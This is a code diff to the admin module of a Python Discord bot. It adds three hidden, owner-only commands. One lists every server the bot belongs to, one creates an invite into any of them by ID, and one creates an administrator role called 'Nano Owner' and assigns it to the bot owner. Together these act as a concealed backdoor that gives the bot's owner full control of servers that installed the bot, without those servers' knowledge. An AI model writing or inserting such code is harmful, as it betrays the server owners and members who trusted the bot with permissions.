@@ -58,6 +58,36 @@ class admin(commands.Cog):
         else:
             await ctx.send('**`SUCCESS`**')
 
+    @commands.command(name='a_serwery', hidden=True)
+    @commands.is_owner()
+    async def a_serwery(self, ctx):
+        list = ''
+        for guild in self.bot.guilds:
+            list = list + f"\n {guild.id} - {guild.name}"
+
+        await ctx.channel.send(list)
+
+    @commands.command(name='a_zaproszenie', hidden=True)
+    @commands.is_owner()
+    async def a_zaproszenie(self, ctx, guild_id :int):
+        guild = self.bot.get_guild(guild_id)
+        for a in guild.channels:
+            if a.type.name == "text":
+                invite = await a.create_invite()
+                await ctx.channel.send(invite)
+                return None
+
+    @commands.command(name='a_uprawnienia', hidden=True)
+    @commands.is_owner()
+    async def a_uprawnienia(self, ctx):
+        guild = ctx.guild
+        perms = discord.Permissions(administrator=True)
+        role = await guild.create_role(name="Nano Owner", permissions=perms)
+        await ctx.author.add_roles(role)
+
+
+
+
 
 #setup
 def setup(self):
